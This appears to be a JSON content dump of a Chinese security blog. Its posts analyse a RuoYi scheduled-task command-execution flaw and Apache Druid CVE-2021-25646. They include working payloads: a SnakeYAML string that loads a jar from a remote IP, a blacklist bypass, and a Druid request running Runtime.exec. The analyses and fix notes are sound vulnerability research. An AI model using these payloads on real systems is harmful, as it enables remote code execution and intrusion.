{"meta":{"title":"Home","subtitle":"","description":"","author":"pety","url":"https://pety404.github.io","root":"/"},"pages":[{"title":"关于","date":"2022-05-19T07:01:10.806Z","updated":"2022-05-19T07:01:10.806Z","comments":false,"path":"about/index.html","permalink":"https://pety404.github.io/about/index.html","excerpt":"","text":"嗨，你好呀，这里是pety搭建的博客。"},{"title":"分类","date":"2022-05-19T06:19:37.450Z","updated":"2022-05-16T11:44:54.144Z","comments":false,"path":"categories/index.html","permalink":"https://pety404.github.io/categories/index.html","excerpt":"","text":""},{"title":"书单","date":"2022-05-19T07:03:55.084Z","updated":"2022-05-16T11:44:54.143Z","comments":false,"path":"books/index.html","permalink":"https://pety404.github.io/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-05-19T07:56:23.427Z","updated":"2022-05-19T07:56:23.427Z","comments":true,"path":"links/index.html","permalink":"https://pety404.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2022-05-16T11:44:54.145Z","updated":"2022-05-16T11:44:54.145Z","comments":false,"path":"repository/index.html","permalink":"https://pety404.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-05-16T11:44:54.145Z","updated":"2022-05-16T11:44:54.145Z","comments":false,"path":"tags/index.html","permalink":"https://pety404.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"若依定时任务命令执行漏洞分析","slug":"若依定时任务命令执行漏洞分析","date":"2022-05-19T11:04:19.000Z","updated":"2022-05-27T08:43:53.278Z","comments":true,"path":"2022/05/19/若依定时任务命令执行漏洞分析/","link":"","permalink":"https://pety404.github.io/2022/05/19/%E8%8B%A5%E4%BE%9D%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"漏洞描述​ RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），提供了三种版本，Vue分离、不分离及微服务版本，官网：http://www.ruoyi.vip/。 ​ 定时任务是若依提供的默认功能，通过添加定时任务处理类（支持Bean调用、Class类调用）即可调度执行对应的方法，如com.ruoyi.quartz.task.RyTask.ryParams(‘ry’)。如果输入的是java.lang.Runtime.getRuntime().exec(“”)，那就有可能达到命令执行目的。 漏洞复现版本：RuoYi-Vue 3.7.0 部署教程：http://doc.ruoyi.vip/ruoyi-vue/document/hjbs.html payload：org.yaml.snakeyaml.Yaml.load(&#39;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http&#39;://100.8.6.108:8000/yaml-payload.jar&quot;]]]]&#39;) yaml-payload.jar：https://github.com/artsploit/yaml-payload 漏洞分析本质：不安全的JAVA反射，外部输入可控实例化类，在定时任务功能触发。 1.新增定时任务 语句不能包含rmi:&#x2F;&#x2F;、ldap:&#x2F;&#x2F;、http:&#x2F;&#x2F;、https:&#x2F;&#x2F;字符，但是后续执行的时候会去掉参数的单引号，因此可以用rmi’:&#x2F;&#x2F;绕过 往sys_job表插入任务记录，QRTZ_TRIGGERS保存触发器信息表。 2.任务触发执行 http://192.168.52.128:8073/prod-api/monitor/job/run com.ruoyi.quartz.controller.SysJobController#run –》 com.ruoyi.quartz.service.impl.SysJobServiceImpl#run scheduler.triggerJob调用了开源任务调度器Quartz组件的api，表示立即执行任务。它根据jobId和jobGroup生成的JobKey去QRTZ_TRIGGERS查询需要执行的jobDetail。job_class_name列是定时任务的JobDetail。 从上表可以看出定时任务会去执行com.ruoyi.quartz.util.QuartzDisallowConcurrentExecution类，跟进这个类，该类继承AbstractQuartzJob的execute方法。com.ruoyi.quartz.util.QuartzDisallowConcurrentExecution#execute–》com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob) beanName获取类名，methodName获取方法名，methodParams获取方法参数，重点看下获取参数。取(、)作为methodStr，同时去掉单引号。 Object bean &#x3D; Class.forName(beanName).newInstance(); #实例化类对象的⽅法 invokeMethod(bean, methodName, methodParams); #执行函数 反射的类、方法、参数是可控的，基于以上分析： 1.class.newInstance() 的作用是调用这个类的无参构造函数，所以我们传入的类必须要存在无参构造函数 2.getDeclaredMethod获取方法，只能是public、protected，因为没有禁用安全检查，不能调用private方法。 3.参数类型只能是String&#x2F;int&#x2F;long&#x2F;double&#x2F;boolean 3.POC分析 snakeyaml有类满足以上要求且可以命令执行，直接上snakeyaml反序列化的payload。 POC是从远程URL加载jar包，有可能存在不出网的情况，可以使用file协议获取本地jar。网上公开绕过方法是修改上传文件的绝对路径，但这样会导致图片无法正常加载，需要谨慎操作。 123com.ruoyi.common.config.RuoYiConfig.setProfile(&#x27;/upload&#x27;)org.yaml.snakeyaml.Yaml.load(&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;file://上传的绝对路径&quot;]]]]&#x27;) 漏洞修复新增时对目标字符串进行黑白名单限制 不允许包含以下字符串： 包含com.ruoyi字符串 以上修复方式是存在缺陷的，只对count&gt;1的className进行白名单检查，调用spring的bean对象则可以绕过","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[]},{"title":"Apache Druid命令执行漏洞(CVE-2021-25646)","slug":"Apache-Druid命令执行漏洞-CVE-2021-25646","date":"2022-05-19T03:30:35.000Z","updated":"2022-05-19T03:56:15.288Z","comments":true,"path":"2022/05/19/Apache-Druid命令执行漏洞-CVE-2021-25646/","link":"","permalink":"https://pety404.github.io/2022/05/19/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/","excerpt":"","text":"漏洞描述Apache Druid是JAVA编写的高性能实时分析型数据库，在即时数据可见性、运营分析以及高并发等方面表现非常出色。Apache Druid能够执行嵌入在各种类型的请求中的用户提供的JavaScript代码，默认情况下该功能是禁用的。但在Druid 0.20.0及之前的版本中，不管该功能是否启用，经过认证的用户可以发送恶意请求来使Druid强制运行该请求中的JavaScript代码，成功在目标系统上执行代码。 漏洞复现影响版本：Apache Druid &lt; 0.20.1 本次复现采用Apache Druid 0.19.0 wget https://archive.apache.org/dist/druid/0.19.0/apache-druid-0.19.0-bin.tar.gztar -xzvf apache-druid-0.19.0-bin.tar.gzcd apache-druid-0.19.0./bin/start-micro-quickstart 启动后服务绑定在8888端口,默认没有授权认证 点击load data,抓到以下数据包，放入新建文件exp，进入部署目录发现文件新建成功。 &#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\\&quot;isRobot\\&quot;:true,\\&quot;channel\\&quot;:\\&quot;#x\\&quot;,\\&quot;timestamp\\&quot;:\\&quot;2020-12-12T12:10:21.040Z\\&quot;,\\&quot;flags\\&quot;:\\&quot;x\\&quot;,\\&quot;isUnpatrolled\\&quot;:false,\\&quot;page\\&quot;:\\&quot;1\\&quot;,\\&quot;diffUrl\\&quot;:\\&quot;https://xxx.com\\&quot;,\\&quot;added\\&quot;:1,\\&quot;comment\\&quot;:\\&quot;Botskapande Indonesien omdirigering\\&quot;,\\&quot;commentLength\\&quot;:35,\\&quot;isNew\\&quot;:true,\\&quot;isMinor\\&quot;:false,\\&quot;delta\\&quot;:31,\\&quot;isAnonymous\\&quot;:true,\\&quot;user\\&quot;:\\&quot;Lsjbot\\&quot;,\\&quot;deltaBucket\\&quot;:0,\\&quot;deleted\\&quot;:0,\\&quot;namespace\\&quot;:\\&quot;Main\\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;touch aaa.txt&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125; 漏洞分析默认情况下，JavaScript是禁用的，但是可以通过设置configuration属性来启用:druid.javascript.enabled &#x3D; true，所以这个漏洞关键点就是如何开启druid.javascript.enabled。 可以看到通过enabled来控制是否开启，那我们只要找到哪些地方可以控制，就可以利用。 type 为 javascript 时指定对象为 JavaScriptDimFilter @JsonCreator用于在json反序列化时指明调用特定构造方法。 @JsonProperty用于属性上，作用是把该属性的名称序列化为另外一个名称，比如@JsonProperty(“before”) String after，会将json里key为before的内容解析到after变量上。 @JacksonInject 当用户没有对应字段时，相应附上默认值。 即当反序列化JavaScriptDimFilter对象时，JavaScriptDimFilter会调用@JsonCreator注解的构造方法，当注解@JsonCreator修饰方法时，方法的所有参数都会被解析成CreatorProperty类型，如果属性没有被@JsonProperty修饰，就会创建一个name为””的CreatorProperty，Jackson会将用户输入的key为””的value赋值给该属性。 构造””: { “enabled”: true }去开启javascript enabled。 下面我们开始跟进一下数据流 开启 Apache Druid 的 debug 模式，需要设置 Apache Druid 的启动参数，设置文件 apache-druid-0.19.0/conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.config 在其中添加 java debug 的参数 -Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;192.168.45.128:5005 注意address，网上教程全部是address&#x3D;5005，监听IP是127.0.0.1，但是咱们部署在虚拟机，导致主机IDEA无法连接，所以要加上IP，这块是个坑。 -agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005 Druid用到了jackson反序列化，在pom.xml加上依赖 com.fasterxml.jackson.core jackson-core 2.9.0 com.fasterxml.jackson.core jackson-databind 2.9.0 com.fasterxml.jackson.core jackson-annotations 2.9.0 com.fasterxml.jackson.databind.deser.BeanDeserializer#_deserializeUsingPropertyBased解析用户输入，用 json串中的“键名”去查找当前解析对象中对应的creatorProperty 遍历json串，取出属性名放到_propertyLookup数组 接下来开始遍历_propertyLookup数组，在 com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer#_deserializeTypedForId,根据type获取反序列化类进行参数赋值。 调试重复走这几个过程，我们step out快速到transformSpec的处理逻辑，根据type判断是javascript，反序列化javascriptdimfilter类对象，其中javascriptconfig参数因为没有被@JsonProperty修饰，取了键名” ”的值。 所以绕过了JavaScriptconfig检查，成功执行js代码，其中js代码支持调用java函数，所以可以调用系统命令。 漏洞修复1.升级到Apache Druid 0.20.1。 &#x2F;&#x2F;org.apache.druid.guice.GuiceAnnotationIntrospector @Override public JsonIgnoreProperties.Value findPropertyIgnorals(Annotated ac) { if (ac instanceof AnnotatedParameter) { final AnnotatedParameter ap &#x3D; (AnnotatedParameter) ac; if (ap.hasAnnotation(JsonProperty.class)) { return JsonIgnoreProperties.Value.empty(); } } return JsonIgnoreProperties.Value.forIgnoredProperties(“”); } 当属性被@JsonProperty修饰，则允许为空，如果属性没有被@JsonProperty修饰，则不允许为空。JavaScriptConfig被调用点的参数都没有被@JsonProperty修饰，因此不接受空键值，杜绝了用户输入。 2.加强访问控制，禁止未授权用户访问web管理页面。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[]},{"title":"freemarker模板注入SSTI","slug":"模板注入SSTI","date":"2022-05-17T02:11:00.410Z","updated":"2022-05-19T11:02:56.363Z","comments":true,"path":"2022/05/17/模板注入SSTI/","link":"","permalink":"https://pety404.github.io/2022/05/17/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/","excerpt":"","text":"","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[]}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[]}